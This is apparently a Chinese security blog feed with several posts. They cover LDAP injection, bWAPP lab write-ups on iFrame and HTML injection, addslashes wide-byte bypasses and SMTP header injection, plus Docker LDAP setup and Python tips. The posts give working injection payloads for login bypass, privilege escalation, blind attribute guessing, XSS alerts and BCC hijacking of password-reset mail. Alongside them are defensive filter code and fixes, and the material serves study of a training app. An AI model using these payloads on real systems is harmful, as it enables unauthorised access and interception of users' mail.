<h1 id="Web应用中的LDAP注入"><a href="#Web应用中的LDAP注入" class="headerlink" title="Web应用中的LDAP注入"></a>Web应用中的LDAP注入</h1><p>(attribute=value):如果过滤器用于构造查询单缺少逻辑操作符，如value)(injected_filter的注入会导致两个过滤器(attribute=value)(injected_filter)。在OpenLDAP实施中，第二个过滤器会被忽略，只有第一个会被执行。而在ADAM中，有两个过滤器的查询是不被允许的，因而这个注入毫无用处。</p>
<p>(|(attribute=value)(second_filter)) or (&amp;(attribute=value)(second_filter)):如果第一个用于构造查询的过滤器有逻辑操作符，形如value)(injected_filter)的注入会变成如下过滤器：(&amp;(attribute=value)(injected_filter)) (second_filter)。虽然过滤器语法上并不正确，OpenLDAP还是会从左到右进行处理，忽略第一个过滤器闭合后的任何字符。一些LDAP客户端Web组成会忽略第二个过滤器，将ADAM和OpenLDAP发送给第一个完成的过滤器，因而存在注入。</p>
<p>一些应用框架在将请求发送给服务器之前会检查过滤器是否正确，在这种情况下，过滤器语义上必须是正确的，其注入如：value)(injected_filter))(&amp;(1=0。这会导致出现两个不同的过滤器，第二个会被忽略：(&amp;(attribute=value)(injected_filter))(&amp;(1=0)(second_filter))。</p>
<p>既然第二个过滤器会被LDAP服务器忽略，有些部分便不允许有两个过滤器的查询。这种情况下，只能构建一个特殊的注入以获得单个过滤器的LDAP查询。value)(injected_filter这样的注入产生的结果是：(&amp;(attribute=value)(injected_filter)(second_filter))。</p>
<h2 id="AND注入"><a href="#AND注入" class="headerlink" title="AND注入"></a>AND注入</h2><ul>
<li>绕过访问控制</li>
</ul>
<p>后端语句</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(&amp;(parameter1=value1)(parameter2=value2))</span><br></pre></td></tr></table></figure>
<p>注入方式 (构造paylaod)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">username)(&amp;))</span><br></pre></td></tr></table></figure>
<p>最终形成语句</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(&amp;(parameter1=username)(&amp;))(parameter2=value2))</span><br></pre></td></tr></table></figure>
<p>由于服务器只处理第一个过滤器，即仅查询<strong>(&amp;(username=username)(&amp;))</strong>，故<br>只要输入的username正确，这个表达式就永真，就可以使用任意密码进入</p>
<ul>
<li>权限提升<br>后端语句<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(&amp;(directory=document)(security_level=low))</span><br></pre></td></tr></table></figure>
注入方式 (构造paylaod)</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">document)(security_level=*))(&amp;(directory=documents</span><br></pre></td></tr></table></figure>
<p>最终形成语句</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(&amp;(directory=documents)(security_level=*))(&amp;(direcroty=documents)(security_level=low))</span><br></pre></td></tr></table></figure>
<p>由于服务器只处理第一个过滤器而忽略第二个，故只有(&amp;(directory=documents)(security_level=*))被解析</p>
<h2 id="OR注入"><a href="#OR注入" class="headerlink" title="OR注入"></a>OR注入</h2><p> 后端语句</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(|(<span class="built_in">type</span>=Rsc1)(<span class="built_in">type</span>=Rsc2))</span><br></pre></td></tr></table></figure>
<p>注入方式 (构造paylaod)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">printer)(uid=*)</span><br></pre></td></tr></table></figure>
<p>最终形成语句</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(|(<span class="built_in">type</span>=printer)(uid=*))(<span class="built_in">type</span>=scanner)</span><br></pre></td></tr></table></figure>
<h2 id="LDAP盲注入"><a href="#LDAP盲注入" class="headerlink" title="LDAP盲注入"></a>LDAP盲注入</h2><h2 id="AND盲注"><a href="#AND盲注" class="headerlink" title="AND盲注"></a>AND盲注</h2><p> 后端语句</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(&amp;(objectClass=printer)(<span class="built_in">type</span>=Epson*))</span><br></pre></td></tr></table></figure>
<p>注入方式 (构造paylaod)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*)(objectClass=*))(&amp;(objectClass=void</span><br></pre></td></tr></table></figure>
<p>最终形成语句</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(&amp;(objectClass=*)(objectClass=*))(&amp;(objectClass=void)(<span class="built_in">type</span>=Epson*))</span><br><span class="line"><span class="comment">#仅第一个LDAP过滤器会被处理：(&amp;(objectClass=*)(objectClass=*))</span></span><br></pre></td></tr></table></figure>
<h2 id="OR盲注"><a href="#OR盲注" class="headerlink" title="OR盲注"></a>OR盲注</h2><p>因为使用的是OR逻辑操作符，用于推测想要的信息的逻辑与AND是相反的。<br> 后端语句</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(|(objectClass=printer)(<span class="built_in">type</span>=Epson*))</span><br></pre></td></tr></table></figure>
<p>注入方式 (构造paylaod)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">void)(objectClass=void))(&amp;(objectClass=void</span><br></pre></td></tr></table></figure>
<p>最终形成语句</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(|(objectClass=void)(objectClass=void))(&amp;(objectClass=void)(<span class="built_in">type</span>=Epson*))</span><br></pre></td></tr></table></figure>
<h2 id="属性值爆破方法"><a href="#属性值爆破方法" class="headerlink" title="属性值爆破方法"></a>属性值爆破方法</h2><p>先用字符集削减方法获取存在的字符，再用Booleanization进行排列组合获取属性值</p>
<ol>
<li>Booleanization</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#猜想该属性值是否为a开始</span></span><br><span class="line">(&amp;(idprinter=HPLaserJet2100)(department=a*))(object=printer))</span><br><span class="line"><span class="comment">#如果为a 开头，继续猜想第二个是否为a开始</span></span><br><span class="line">(&amp;(idprinter=HPLaserJet2100)(department=aa*))(object=printer))</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>字符集削减</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用通配符测试给定的字符在值中是否为a</span></span><br><span class="line">(&amp;(idprinter=HPLaserJet2100)(department=*a*))(object=printer))</span><br></pre></td></tr></table></figure>
<p>一旦字符集削减完成，只有发现的那些字母会用于booleanization处理，因此减少了请求的数量。</p>
<h1 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h1><p>总而言之，就是进行（）适当闭合，再利用&amp; | 造成过滤，逃逸</p>
<h1 id="防御LDAP注入"><a href="#防御LDAP注入" class="headerlink" title="防御LDAP注入"></a>防御LDAP注入</h1><p>LDAP攻击都是作用于<strong>应用层</strong>，因此网络层的防火墙和入侵检测机制无法防御这些LDAP注入攻击</p>
<ol>
<li>对圆括号、星号、逻辑操作符、关系运操作符在应用层都必须过滤</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ldapi_check_1</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Replaces dangerous characters: ( ) = &amp; | * WHITESPACE</span></span><br><span class="line">    $input = str_replace(<span class="string">"("</span>, <span class="string">""</span>, $data);</span><br><span class="line">    $input = str_replace(<span class="string">")"</span>, <span class="string">""</span>, $input);</span><br><span class="line">    $input = str_replace(<span class="string">"="</span>, <span class="string">""</span>, $input);</span><br><span class="line">    $input = str_replace(<span class="string">"&amp;"</span>, <span class="string">""</span>, $input);</span><br><span class="line">    $input = str_replace(<span class="string">"|"</span>, <span class="string">""</span>, $input);</span><br><span class="line">    $input = str_replace(<span class="string">"*"</span>, <span class="string">""</span>, $input);</span><br><span class="line">    $input = str_replace(<span class="string">" "</span>, <span class="string">""</span>, $input);</span><br><span class="line">    <span class="keyword">return</span> $input;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>或使用反斜杠转义处理</li>
</ol>
<p><a href="https://blog.csdn.net/quiet_girl/article/details/50716312" target="_blank" rel="noopener">LDAP注入与防御</a></p>
<h1 id="Docker快速搭建LDAP"><a href="#Docker快速搭建LDAP" class="headerlink" title="Docker快速搭建LDAP"></a>Docker快速搭建LDAP</h1><p><a href="https://www.freesion.com/article/397040669/" target="_blank" rel="noopener">LDAP快速搭建</a></p>
<ul>
<li>安装openldap</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run \</span><br><span class="line">-p 389:389 \</span><br><span class="line">-p 636:636 \</span><br><span class="line">--name youe_ldap \</span><br><span class="line">--network bridge \</span><br><span class="line">--hostname openldap-host \</span><br><span class="line">--env LDAP_ORGANISATION=<span class="string">"youedata"</span> \</span><br><span class="line">--env LDAP_DOMAIN=<span class="string">"youedata.com"</span> \</span><br><span class="line">--env LDAP_ADMIN_PASSWORD=<span class="string">"youedata520"</span> \</span><br><span class="line">--detach osixia/openldap</span><br></pre></td></tr></table></figure>
<p>配置LDAP组织者：–env LDAP_ORGANISATION=”youedata”</p>
<p>配置LDAP域：–env LDAP_DOMAIN=”youedata.com”</p>
<p>配置LDAP密码：–env LDAP_ADMIN_PASSWORD=”youedata520”</p>
<p>默认登录用户名：admin</p>
<ul>
<li>安装一个管理工具，可视化操作界面</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run \</span><br><span class="line">-d --privileged \</span><br><span class="line">-p 18004:80 \</span><br><span class="line">--name youe_pla \</span><br><span class="line">--env PHPLDAPADMIN_HTTPS=<span class="literal">false</span> \</span><br><span class="line">--env PHPLDAPADMIN_LDAP_HOSTS=127.0.0.1 \   </span><br><span class="line">--detach osixia/phpldapadmin</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">访问http://127.0.0.1:18004进行登录</span><br></pre></td></tr></table></figure>

<p>Login DN：cn=admin,dc=youedata,dc=com<br>Password：youedata520</p>
]]></content>
  </entry>
  <entry>
    <title>bWAPP--iFrame Injection</title>
    <url>/2020/09/16/bWAPP--iFrame%20Injection/</url>
    <content><![CDATA[<h1 id="iFrame-Injection"><a href="#iFrame-Injection" class="headerlink" title="iFrame Injection"></a>iFrame Injection</h1><ul>
<li>low</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20200912184921313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#引号绕过，适当闭合</span></span><br><span class="line">http://127.0.0.1/iframei.php?ParamUrl=<span class="string">"&gt;&lt;/iframe&gt;&lt;script&gt;alert("</span>GetPass<span class="string">")&lt;/script&gt;&lt;iframe&amp;ParamWidth=250&amp;ParamHeight=234</span></span><br></pre></td></tr></table></figure>

<ul>
<li>mid<br>&lt;!--注释绕过<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;/iframe&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--</span></span><br></pre></td></tr></table></figure></li>
<li>high<br>无法绕过</li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="addslashes注入方法"><a href="#addslashes注入方法" class="headerlink" title="addslashes注入方法"></a>addslashes注入方法</h2><ul>
<li>宽字节注入<br><img src="https://img-blog.csdnimg.cn/20200912201247461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><a href="https://www.cnblogs.com/fengshui/p/9266830.html" target="_blank" rel="noopener">宽字节注入</a></li>
</ul>
<ol>
<li>设置数据库字符为gbk导致宽字节注入<br><img src="https://img-blog.csdnimg.cn/20200912194224500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>gbk是多字节编码,两个字节代表一个汉字，而php为单字节编码，又gbk编码存在如<strong>運</strong>的编码中存在<strong>\</strong>，故php在读取<strong>運</strong>时，获取 一个\，再加上addslashes自身会对出现的 特殊字符（如 ‘ “）进行转义为  &#39;  ，故合并之后会出现 \\ ‘ ,用\ 转义\，进行绕过。</li>
<li>使用icon,mb_convert_encoding转换字符编码函数导致宽字节注入<br><img src="https://img-blog.csdnimg.cn/20200912195456602.png#pic_center" alt="在这里插入图片描述"></li>
</ol>
<ul>
<li>编码解码导致的绕过<ol>
<li>url解码导致绕过addslashes<img src="https://img-blog.csdnimg.cn/20200912195537843.png#pic_center" alt="在这里插入图片描述"><br>对输入字段进行两次编码，（因为一次浏览器默认会对输入内容进行一次decode）,故在后端再次解码之后就会出现 ‘ 进行闭合。</li>
<li>base64解码导致绕过addslashes （同理）</li>
<li>json编码导致绕过addslashes<br><img src="https://img-blog.csdnimg.cn/2020091219594925.png#pic_center" alt="在这里插入图片描述"><br>addslashes之后获得 &#39; json编码之后转移为  \\‘<br>json编码绕过addslashes是因为json编码会把\转换为\\</li>
</ol>
</li>
</ul>
<p><a href="https://bbs.ichunqiu.com/thread-10899-1-1.html" target="_blank" rel="noopener">addslashes转义绕过</a><br><a href="https://bbs.csdn.net/topics/90195158" target="_blank" rel="noopener">運</a></p>
<ul>
<li>注释绕过<br>&lt;!--</li>
</ul>
<h2 id="addslashes防御方法"><a href="#addslashes防御方法" class="headerlink" title="addslashes防御方法"></a>addslashes防御方法</h2><ul>
<li>编码宽字节注入<br>（1）使用mysql_set_charset(GBK)指定字符集<br>（2）使用mysql_real_escape_string进行转义<br>原理是，mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面e5和5c拼接为一个宽字节的问题，但是这个“当前字符集”如何确定呢？就是使用mysql_set_charset进行指定。上述的两个条件是“与”运算的关系，少一条都不行。</li>
<li>编码解码导致的绕过<br>对解码后的字符再次进行过滤</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>bWAPP--HTML Injection</title>
    <url>/2020/09/16/bWAPP--HTML%20Injection/</url>
    <content><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="什么是HTML注入？"><a href="#什么是HTML注入？" class="headerlink" title="什么是HTML注入？"></a>什么是HTML注入？</h2><p>HTML注入(Hypertext Markup Language Injection)中文意思是“超文本标记性语言注入”，众所周知HTML含有各种标签，如果<strong>Web应用程序对用户输入的数据没进行彻底的处理</strong>的话，那么一些非法用户提交的数据可能含有HTML其他标签，而这些数据又恰好被服务器当作正常的HTML标签显示，那么最终的结果是非法标签被解析(可以应用于钓鱼、社会工程学等)，对其他用户造成很大影响。</p>
<h2 id="HTML注入与XSS的区别"><a href="#HTML注入与XSS的区别" class="headerlink" title="HTML注入与XSS的区别"></a>HTML注入与XSS的区别</h2><p>XSS(Cross-site Scripting)中文翻译是“跨站脚本攻击”，XSS本质上是HTML注入攻击，但又不同于HTML注入，<strong>XSS利用脚本标记运行JavaScript等脚本程序，可以通过JavaScript获取机密数据和一些列危险操作，而HTML注入只是使用HTML标签修改页面内容。</strong></p>
<h1 id="GET-Injection（注入型）"><a href="#GET-Injection（注入型）" class="headerlink" title="GET  Injection（注入型）"></a>GET  Injection（注入型）</h1><ul>
<li>LOW</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">"Get pass"</span>)&lt;/script&gt;</span><br><span class="line"><span class="comment">#&lt;a href=http://www.baidu.com&gt;Click Me&lt;/a&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>mid<br>通过源码可知，进行了 &lt;&gt;替换,故可用编码绕过<br><img src="https://img-blog.csdnimg.cn/2020091120221654.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#&lt;script&gt;alert("Get pass")&lt;/script&gt; URL编码绕过</span></span><br><span class="line">%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%30%29%3c%2f%73%63%72%69%70%74%3e%0a</span><br></pre></td></tr></table></figure></li>
<li>high<br><img src="https://img-blog.csdnimg.cn/20200911202329609.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>高安全级别使用了htmlspecialchars函数（htmlspecialchars 把特殊字符转为HTML实体 ），很难绕过。<br>其中，<strong>htmlspecialchars默认配置是不过滤单引号的</strong>。只有设置了: quotestyle 选项为ENT_ QUOTES才会过滤单引号<br>故存在  ‘ 闭合绕过。<a href="https://www.zhihu.com/question/27646993" target="_blank" rel="noopener">htmlspecialchars存在的可能绕过方法</a><br><img src="https://img-blog.csdnimg.cn/20200911213807113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li>
</ul>
<h1 id="POST-Injection（注入型）"><a href="#POST-Injection（注入型）" class="headerlink" title="POST Injection（注入型）"></a>POST Injection（注入型）</h1><ul>
<li>low<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">"GetPass"</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
<li>mid</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%47%65%74%50%61%73%73%22%29%3c%2f%73%63%72%69%70%74%3e</span><br></pre></td></tr></table></figure>

<ul>
<li>high<br>无法绕过<h2 id="Reflected-反射型"><a href="#Reflected-反射型" class="headerlink" title="Reflected (反射型)"></a>Reflected (反射型)</h2></li>
<li>low<br><img src="https://img-blog.csdnimg.cn/20200911211016384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>故更改，HOST、URI字段可绕过</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ？ 或 #绕过  </span></span><br><span class="line">GET /htmli_current_url.php?a=&lt;script&gt;alert(<span class="string">"GetPass"</span>)&lt;/script&gt; HTTP/1.1</span><br><span class="line"><span class="comment">#GET /htmli_current_url.php#a=&lt;script&gt;alert("GetPass")&lt;/script&gt; HTTP/1.1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/2020091121104147.png#pic_center" alt="在这里插入图片描述"></p>
<ul>
<li>mid、high<br>不可绕过<br><img src="https://img-blog.csdnimg.cn/20200911211216164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><h2 id="Stored-（存储型）"><a href="#Stored-（存储型）" class="headerlink" title="Stored （存储型）"></a>Stored （存储型）</h2></li>
<li>low<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(“GetPass<span class="string">")&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
<img src="https://img-blog.csdnimg.cn/2020091121273658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li>
<li>mid/high<br><img src="https://img-blog.csdnimg.cn/20200911213334309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li>
</ul>
<h1 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h1><ul>
<li>将特殊字符转换为 HTML 实体（如php的htmlspecialchars方法）</li>
<li>对传入的字符串会根据当前连接的字符集进行转义，得到一个编码后的合法的 SQL 语句。（如php的mysqli_real_escape_string方法）</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>bWAPP--STMP</title>
    <url>/2020/09/15/bWAPP--STMP/</url>
    <content><![CDATA[<h1 id="bWAPP–STMP-Injection"><a href="#bWAPP–STMP-Injection" class="headerlink" title="bWAPP–STMP Injection"></a>bWAPP–STMP Injection</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="什么是SMTP"><a href="#什么是SMTP" class="headerlink" title="什么是SMTP"></a>什么是SMTP</h3><p>SMTP 就是 Simple Mail Transfer Protocol 的缩写翻译来就是邮件传输协议，也就是用来发邮件的。</p>
<h3 id="常见的标题头"><a href="#常见的标题头" class="headerlink" title="常见的标题头"></a>常见的标题头</h3><ul>
<li><p>return-path：邮件的回复地址。</p>
</li>
<li><p>from：发件人地址。</p>
</li>
<li><p>to：收件人地址。</p>
</li>
<li><p>subject：邮件主题，即邮件名。</p>
</li>
<li><p>body：邮件内容。</p>
</li>
<li><p>date：邮件发送日期。</p>
</li>
<li><p>cc：抄送。</p>
</li>
<li><p>bcc：密送。</p>
</li>
</ul>
<h2 id="常见攻击手法"><a href="#常见攻击手法" class="headerlink" title="常见攻击手法"></a>常见攻击手法</h2><ul>
<li><p>cc/bcc注入</p>
<p>正常表单：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">name=tom&amp;email=tom@mail.com&amp;password=passwd&amp;form=submit</span><br></pre></td></tr></table></figure>

<p>cc/bcc注入后的表单</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">name=tom&amp;email=tom@mail.com%0Ahacker@mail.com&amp;password=passwd&amp;form=submit</span><br></pre></td></tr></table></figure>

<p>其中%0A为\n 的url编码后的编码,这样邮件就会密送给hacker的邮箱</p>
<p>windows 中 \n\r为回车换行</p>
<p>linux 中 \n 为换行</p>
</li>
<li><p>邮件主题注入</p>
<p>正常表单：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">name=tom&amp;email=tom@mail.com&amp;password=passwd&amp;form=submit</span><br></pre></td></tr></table></figure>

<p>主题注入</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">name=tom&amp;email=tom@mail.com%Subject:This is fake subject&amp;password=passwd&amp;form=submit</span><br></pre></td></tr></table></figure>

<p>这样原来的主题就被修改为this is fake subject（不过这个取决于代码编写的容错性，出现两个subject时时选择丢弃还是后者覆盖）</p>
</li>
<li><p>改变消息的主题body</p>
<p>正常表单：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">name=tom&amp;email=tom@mail.com&amp;password=passwd&amp;form=submit</span><br></pre></td></tr></table></figure>

<p>消息注入</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">name=tom&amp;email=tom@mail.com%0A%0A this is new message&amp;password=passwd&amp;form=submit</span><br></pre></td></tr></table></figure>

<p>this is a new message被添加到原消息中</p>
</li>
<li><p>参数注入</p>
<p>正常表单：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">name=tom&amp;email=tom@mail.com&amp;password=passwd&amp;form=submit</span><br></pre></td></tr></table></figure>

<p>参数注入</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">name=tom&amp;email=tom@mail.com%0Ahacker@mail.com&amp;password=passwd&amp;form=submit</span><br></pre></td></tr></table></figure>
<p>  消息被发送到原来的收件人和攻击者账号</p>
</li>
</ul>
<h2 id="常见利用手法"><a href="#常见利用手法" class="headerlink" title="常见利用手法"></a>常见利用手法</h2><ol>
<li><p>利用SMTP头注入劫持找回密码邮件</p>
<p>思路：<br>利用SMTP头注入，将攻击者email地址添加为CC或BCC，从而劫持到比如找回密码邮件（<em>需要目标业务未对邮件地址做校验就发邮件，利用场景有限</em>）</p>
</li>
<li><p>利用SMTP头注入发送垃圾邮件，实施短信轰炸，社工等</p>
</li>
</ol>
<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>对用户输入进行过滤，过滤其中的恶意字符（如  （ ） \ ）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">maili_check_2</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// URL decoding %0A -&gt; \n and %0D -&gt; \r</span></span><br><span class="line">    <span class="comment">//浏览器会自动对url进行编码一次。所以需要解码</span></span><br><span class="line">    $input = urldecode($data);</span><br><span class="line">    </span><br><span class="line">    $input = filter_var($input, FILTER_SANITIZE_EMAIL);</span><br><span class="line">    <span class="comment">//FILTER_SANITIZE_EMAIL 过滤器删除字符串中所有非法的 e-mail 字符。</span></span><br><span class="line">    <span class="comment">//该过滤器允许所有的字符、数字以及 $-_.+!*'&#123;&#125;|^~[]`#%/?@&amp;=</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// FILTER_SANITIZE_EMAIL:过滤器删除字符串中所有非法的 e-mail 字符</span></span><br><span class="line">    <span class="comment">// FILTER_VALIDATE_EMAIL:过滤器把值作为电子邮件地址来验证</span></span><br><span class="line">    <span class="keyword">return</span> $input;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
  </entry>
  <entry>
    <title>python杂技</title>
    <url>/2020/08/24/python%E6%9D%82%E6%8A%80/</url>
    <content><![CDATA[<h1 id="数据类型的转换"><a href="#数据类型的转换" class="headerlink" title="数据类型的转换"></a>数据类型的转换</h1><h2 id="Str–-gt-dict"><a href="#Str–-gt-dict" class="headerlink" title="Str–&gt;dict"></a>Str–&gt;dict</h2><p>使用json的loads()/dumps()函数进行转换</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">test = <span class="string">'&#123;"name":"tom","age":12&#125;'</span></span><br><span class="line">print(type(test))</span><br><span class="line"><span class="comment">#&lt;class 'dict'&gt;</span></span><br><span class="line">print(type(json.loads(test)))</span><br><span class="line"><span class="comment">#&lt;class 'dict'&gt;</span></span><br><span class="line">print(type(json.dumps(test)))</span><br><span class="line"><span class="comment">#&lt;class 'str'&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="string–-gt-bytes"><a href="#string–-gt-bytes" class="headerlink" title="string–&gt;bytes"></a>string–&gt;bytes</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test = <span class="string">'bytes'</span>.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">print(<span class="string">'test_value:&#123;0&#125;,test_type:&#123;1&#125;'</span>.format(test,type(test)))</span><br><span class="line"><span class="comment">#test_value:b'bytes',test_type:&lt;class 'bytes'&gt;</span></span><br><span class="line">test_decode = test.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">print(<span class="string">'test_decode_value:&#123;0&#125;,test_decode_type:&#123;1&#125;'</span>.format(test_decode,type(test_decode)))</span><br><span class="line"><span class="comment">#test_decode_value:bytes	test_decode_type:&lt;class 'str'&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://www.cnblogs.com/abclife/p/7445222.html" target="_blank" rel="noopener">参考链接</a></p>
</blockquote>
<h1 id="页面元素定位获取"><a href="#页面元素定位获取" class="headerlink" title="页面元素定位获取"></a>页面元素定位获取</h1><blockquote>
<p><a href="https://blog.csdn.net/rankun1/article/details/81357179?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~first_rank_v2~rank_v25-1-81357179.nonecase&utm_term=python%E6%8A%93%E5%8F%96%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0" target="_blank" rel="noopener">页面元素定位获取</a></p>
</blockquote>
<h1 id="requests库"><a href="#requests库" class="headerlink" title="requests库"></a>requests库</h1><h2 id="如何从sesion会话中获取cookie"><a href="#如何从sesion会话中获取cookie" class="headerlink" title="如何从sesion会话中获取cookie"></a>如何从sesion会话中获取cookie</h2><p>我们存储cookies时，是把它先转成字典，再转成字符串。读取cookies则刚好相反，要先把字符串转成字典，再把字典转成cookies本来的格式。<br><img src="https://img-blog.csdnimg.cn/20200822142455696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
